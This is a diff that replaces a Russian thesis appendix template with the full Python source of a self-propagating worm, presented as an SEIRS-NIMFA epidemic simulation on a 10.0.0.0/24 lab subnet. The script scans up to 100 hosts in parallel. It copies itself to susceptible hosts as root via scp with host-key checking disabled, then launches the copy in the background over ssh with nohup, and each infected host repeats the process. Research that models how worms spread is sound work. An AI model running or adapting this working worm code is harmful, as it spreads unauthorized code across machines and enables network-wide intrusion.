@@ -1,10 +1,472 @@
-# Приложение
+# Код программы распространения компьютерного червя
 
-Приложения помещают после списка использованных источников.
-В составе приложений могут быть представлены таблицы, диаграммы, схемы, графики, позволяющие раскрыть тему, имеющие вспомогательное значение для текста работы, но не включенные в ее основную часть.
+``` {.python xleftmargin=1em,linenos}
+#!/usr/bin/env python3
 
-Название конкретного приложения должно раскрывать его содержание.
+"""
+SEIRS-NIMFA worm simulation
+"""
 
-Приводятся табличные и графические результаты (рис. -@fig-luneburg_rays_2).
+import socket
+import argparse
+import ipaddress
+import subprocess
+import threading
+import time
+import os
+import sys
+import fcntl
+import struct
+from datetime import datetime
 
-![Прохождение лучей через линзу Люнеберга](../image/luneburg_rays.png){ #fig-luneburg_rays_2 width=60% }
+PORT = 4000
+SUBNET = "10.0.0.0/24"
+MIN_HOST = 1
+MAX_HOST = 100
+PATIENT_ZERO = "10.0.0.1"
+WORM_PATH = "/tmp/seirs_worm.py"
+STATE_FILE = "/tmp/seirs_state"
+LOCK_FILE = "/tmp/seirs_lock"
+LOG_FILE = "/shared/seirs_log.csv"
+
+BETA  = 0.10    # β : вероятность перехода из здорового состояния в зараженное (S→E)
+ALPHA = 0.40    # α : вероятность заболевания (E→I)
+DELTA = 0.10    # δ : вероятность выздоровления (I→R)
+GAMMA = 0.60    # γ : вероятность реинфекции (R→S)
+
+# Временной шаг Эйлера
+H = 0.01
+# Число итераций модели = 1/h = 100 iterations
+EULER_SUBSTEPS = 100
+
+# Как часто срабатывает state_machine
+TICK = 0.2
+
+current_state = "S"
+state_lock = threading.Lock()
+should_stop = False
+
+LOCAL_IP: str = ""
+state_entered_at = time.monotonic()
+
+# NIMFA вектор состояний: x=S, w=E, y=I, z=R
+nimfa_probs: dict = {"x": 1.0, "w": 0.0, "y": 0.0, "z": 0.0}
+nimfa_lock  = threading.Lock()
+
+# Общий счетчик I соседей
+infectious_neighbours_global: int = 0
+infectious_neighbours_lock = threading.Lock()
+
+
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("10.0.0.254", 80))
+        ip = s.getsockname()[0]
+    finally:
+        s.close()
+    return ip
+
+
+def log_event(event, target_ip="", details=""):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    print(f"[{timestamp}] {event}: {LOCAL_IP} -> {target_ip} ({details})")
+    try:
+        # Write header if file is missing OR empty (touch creates a 0-byte file)
+        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
+            with open(LOG_FILE, "w") as f:
+                f.write("timestamp,source_ip,target_ip,event,details\n")
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{timestamp},{LOCAL_IP},{target_ip},{event},{details}\n")
+    except OSError as e:
+        print(f"[LOG] WARNING: cannot write to {LOG_FILE}: {e}")
+
+
+def set_state(new_state):
+    global current_state, state_entered_at
+    with state_lock:
+        current_state = new_state
+        state_entered_at = time.monotonic()
+        with open(STATE_FILE, "w") as f:
+            f.write(new_state)
+
+
+def get_state():
+    with state_lock:
+        return current_state
+
+def get_state_age():
+    with state_lock:
+        return time.monotonic() - state_entered_at
+
+
+def read_state_file():
+    try:
+        with open(STATE_FILE, "r") as f:
+            return f.read().strip()
+    except:
+        return "S"
+
+
+
+
+def check_remote_state_and_y(ip):
+    s = socket.socket()
+    s.settimeout(0.3)
+    try:
+        s.connect((ip, PORT))
+        data = s.recv(5)
+        if len(data) == 5:
+            state = data[0:1].decode()
+            y_prob = struct.unpack('f', data[1:5])[0]
+            return state, y_prob
+        return "S", 0.0
+    except:
+        return "S", 0.0
+    finally:
+        try:
+            s.close()
+        except:
+            pass
+
+def check_remote_state(ip):
+    state, _ = check_remote_state_and_y(ip)
+    return state
+
+
+def nimfa_step(b_i: float):
+    b = b_i  # BETA * счетчик I соседей
+
+    with nimfa_lock:
+        w = nimfa_probs["w"]
+        y = nimfa_probs["y"]
+        z = nimfa_probs["z"]
+        x = nimfa_probs["x"]
+
+    for _ in range(EULER_SUBSTEPS):
+        dw = (-ALPHA * w + b * x)
+        dy = (-DELTA * y + ALPHA * w)
+        dz = (-GAMMA * z + DELTA * y)
+
+        # Эйлер
+        w = w + H * dw
+        y = y + H * dy
+        z = z + H * dz
+        x = 1.0 - w - y - z
+
+        w = max(0.0, min(1.0, w))
+        y = max(0.0, min(1.0, y))
+        z = max(0.0, min(1.0, z))
+        x = max(0.0, min(1.0, x))
+
+    with nimfa_lock:
+        nimfa_probs["x"] = x
+        nimfa_probs["w"] = w
+        nimfa_probs["y"] = y
+        nimfa_probs["z"] = z
+
+    return x, w, y, z
+
+
+def reset_nimfa_to_state(state: str):
+    """Hard-set the NIMFA probability vector to match a discrete state."""
+    mapping = {
+        "S": {"x": 1.0, "w": 0.0, "y": 0.0, "z": 0.0},
+        "E": {"x": 0.0, "w": 1.0, "y": 0.0, "z": 0.0},
+        "I": {"x": 0.0, "w": 0.0, "y": 1.0, "z": 0.0},
+        "R": {"x": 0.0, "w": 0.0, "y": 0.0, "z": 1.0},
+    }
+    with nimfa_lock:
+        nimfa_probs.update(mapping.get(state, mapping["S"]))
+
+
+def count_infectious_neighbours():
+    sum_y = 0.0
+    net = ipaddress.ip_network(SUBNET, strict=False)
+    for ip in net.hosts():
+        ip_str = str(ip)
+        if ip_str == LOCAL_IP:
+            continue
+        last = int(ip_str.split(".")[-1])
+        if last < MIN_HOST or last > MAX_HOST:
+            continue
+        _, y_prob = check_remote_state_and_y(ip_str)
+        sum_y += y_prob
+    return sum_y
+
+
+def listener():
+    global should_stop
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        s.bind(("0.0.0.0", PORT))
+    except OSError:
+        print(f"[LISTEN] Port {PORT} already in use")
+        return
+    s.listen(10)
+    s.settimeout(1)
+    print(f"[LISTEN] Listening on port {PORT}...")
+    while not should_stop:
+        try:
+            conn, addr = s.accept()
+            state = get_state()
+            with nimfa_lock:
+                y_prob = nimfa_probs["y"]
+            data = state.encode() + struct.pack('f', y_prob)
+            conn.send(data)
+            conn.close()
+        except socket.timeout:
+            continue
+        except:
+            break
+    s.close()
+
+
+def state_machine():
+    """
+    На каждой итерации:
+    1. Считывает число соседей в состоянии I
+    2. Пересчитывает новую вероятность вектора состояний
+    3. Переходит в новое состояние, если вероятность наибольшая
+    """
+    global should_stop, infectious_neighbours_global
+
+    infectious_count = count_infectious_neighbours()
+    with infectious_neighbours_lock:
+        infectious_neighbours_global = infectious_count
+
+    while not should_stop:
+        state = get_state()
+
+        with infectious_neighbours_lock:
+            infectious_count = infectious_neighbours_global
+
+        x, w, y, z = nimfa_step(BETA * infectious_count)
+
+        details = f"x={x:.3f} w={w:.3f} y={y:.3f} z={z:.3f} b={BETA*infectious_count:.3f}"
+
+        dominant = max((("S", x), ("E", w), ("I", y), ("R", z)), key=lambda kv: kv[1])[0]
+        age = get_state_age()
+
+        if state == "S" and dominant == "E":
+            set_state("E")
+            log_event("EXPOSED", LOCAL_IP, details)
+            print(f"[STATE] {LOCAL_IP}: S→E  {details}")
+
+        elif state == "E" and dominant == "I":
+            set_state("I")
+            log_event("INFECTIOUS", LOCAL_IP, details)
+            print(f"[STATE] {LOCAL_IP}: E→I  {details}")
+
+        elif state == "I" and dominant == "R":
+            set_state("R")
+            log_event("RECOVERED", LOCAL_IP, details)
+            print(f"[STATE] {LOCAL_IP}: I→R  {details}")
+
+        time.sleep(TICK)
+
+    print(f"[STATE] {LOCAL_IP} finished state machine (reached R state)")
+
+
+def infect_host(target_ip):
+    try:
+        # Заражаем только узлы S
+        remote_state = check_remote_state(target_ip)
+        if remote_state != "S":
+            return False
+
+        # Чтобы начать копирование, сам узел должен быть в состоянии I по модели SEIRS-NIMFA
+        if get_state() != "I":
+            log_event("FAILED", target_ip, "not_in_I_state")
+            return False
+
+        # Копирование червя
+        result = subprocess.run(
+            ["scp",
+             "-o", "StrictHostKeyChecking=no",
+             "-o", "ConnectTimeout=5",
+             __file__,
+             f"root@{target_ip}:{WORM_PATH}"],
+            capture_output=True, timeout=10
+        )
+        if result.returncode != 0:
+            log_event("FAILED", target_ip, "scp_failed")
+            return False
+
+        # Запуск червя
+        launch = subprocess.run(
+            ["ssh", "-o", "StrictHostKeyChecking=no",
+             "-o", "ConnectTimeout=5",
+             f"root@{target_ip}",
+             f"nohup python3 {WORM_PATH} --seed-exposed </dev/null >/dev/null 2>&1 &"],
+            capture_output=True, timeout=10
+        )
+        if launch.returncode != 0:
+            log_event("FAILED", target_ip, "launch_failed")
+            return False
+
+        # Accept both E and I as successful infection outcomes: on a fast setup
+        # a freshly seeded node can already progress to I before this confirmation.
+        final_st = check_remote_state(target_ip)
+        if final_st not in ("E", "I"):
+            log_event("FAILED", target_ip, f"state_changed_to_{final_st}")
+            return False
+
+        log_event("EXPOSED" if final_st == "E" else "INFECTIOUS", target_ip, "success")
+        return True
+
+    except subprocess.TimeoutExpired:
+        log_event("FAILED", target_ip, "timeout")
+        return False
+    except Exception as e:
+        log_event("FAILED", target_ip, str(e))
+        return False
+
+
+# Число одновременных потоков сканирования
+SCAN_WORKERS = 100
+
+
+def _scan_one(ip_str, i_count_ref, i_count_lock):
+    global infectious_neighbours_global
+    """Проверить узел и заразить если он в состоянии S"""
+    if get_state() != "I":
+        return
+
+    remote_state = check_remote_state(ip_str)
+
+    if remote_state == "I":
+        with i_count_lock:
+            i_count_ref[0] += 1
+        print(f"[SCAN] {ip_str}: already infectious")
+    elif remote_state == "E":
+        print(f"[SCAN] {ip_str}: exposed (incubating)")
+    elif remote_state == "R":
+        print(f"[SCAN] {ip_str}: recovered (immune)")
+    else:
+        print(f"[SCAN] {ip_str}: susceptible, attempting infection...")
+        infect_host(ip_str)
+
+    # Обновить b_i
+    with infectious_neighbours_lock:
+        infectious_neighbours_global = i_count_ref[0]
+
+
+def scan():
+    global infectious_neighbours_global
+    import random
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    time.sleep(random.uniform(0.01, 0.05))
+
+    if get_state() != "I":
+        return
+
+    net = ipaddress.ip_network(SUBNET, strict=False)
+    targets = [
+        str(ip) for ip in net.hosts()
+        if str(ip) != LOCAL_IP
+        and MIN_HOST <= int(str(ip).split(".")[-1]) <= MAX_HOST
+    ]
+
+    i_count_ref  = [0]
+    i_count_lock = threading.Lock()
+
+    with ThreadPoolExecutor(max_workers=SCAN_WORKERS) as ex:
+        futures = {
+            ex.submit(_scan_one, ip, i_count_ref, i_count_lock): ip
+            for ip in targets
+        }
+        for f in as_completed(futures):
+            if get_state() != "I":
+                print("[SCAN] Left I state mid-scan, stopping")
+                break
+
+    with infectious_neighbours_lock:
+        infectious_neighbours_global = i_count_ref[0]
+
+    print(f"[SCAN] Pass complete — {i_count_ref[0]} infectious neighbours seen")
+
+
+def main():
+    global should_stop, LOCAL_IP
+
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument("--seed-exposed", action="store_true")
+    args, _ = parser.parse_known_args()
+
+    LOCAL_IP = get_local_ip()
+
+    existing_state = read_state_file()
+
+    if existing_state in ["E", "I"]:
+        remote_state = check_remote_state(LOCAL_IP)
+        if remote_state in ["E", "I"]:
+            print(f"[MAIN] Already running in state {remote_state}, exiting")
+            sys.exit(0)
+
+    try:
+        lock_fd = open(LOCK_FILE, 'w')
+        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+    except (IOError, OSError):
+        print(f"[MAIN] Another instance running on {LOCAL_IP}")
+        sys.exit(0)
+
+    if LOCAL_IP == PATIENT_ZERO:
+        set_state("I")
+        reset_nimfa_to_state("I")
+        log_event("STARTED", LOCAL_IP, "patient_zero")
+    elif args.seed_exposed:
+        set_state("E")
+        reset_nimfa_to_state("E")
+        log_event("EXPOSED", LOCAL_IP, "infected")
+    elif existing_state == "R":
+        set_state("R")
+        reset_nimfa_to_state("R")
+    elif existing_state == "I":
+        set_state("I")
+        reset_nimfa_to_state("I")
+    elif existing_state == "E":
+        set_state("E")
+        reset_nimfa_to_state("E")
+    else:
+        set_state("S")
+        reset_nimfa_to_state("S")
+
+    listener_t = threading.Thread(target=listener, daemon=True)
+    listener_t.start()
+
+    state_machine_t = threading.Thread(target=state_machine, daemon=True)
+    state_machine_t.start()
+
+    time.sleep(0.5)
+
+    while not should_stop:
+        state = get_state()
+        if state == "I":
+            scan()
+            if get_state() == "I":
+                print("[SCAN] Scan complete, restarting in 1 second...")
+                time.sleep(1)
+        elif state == "R":
+            # Reached final state, stop
+            print(f"[MAIN] {LOCAL_IP} reached R state, stopping")
+            break
+        else:
+            time.sleep(0.2)
+
+    print(f"[MAIN] {LOCAL_IP} finished")
+
+    try:
+        fcntl.flock(lock_fd, fcntl.LOCK_UN)
+    except:
+        pass
+
+    time.sleep(2)
+    should_stop = True
+
+
+if __name__ == "__main__":
+    main()
+```
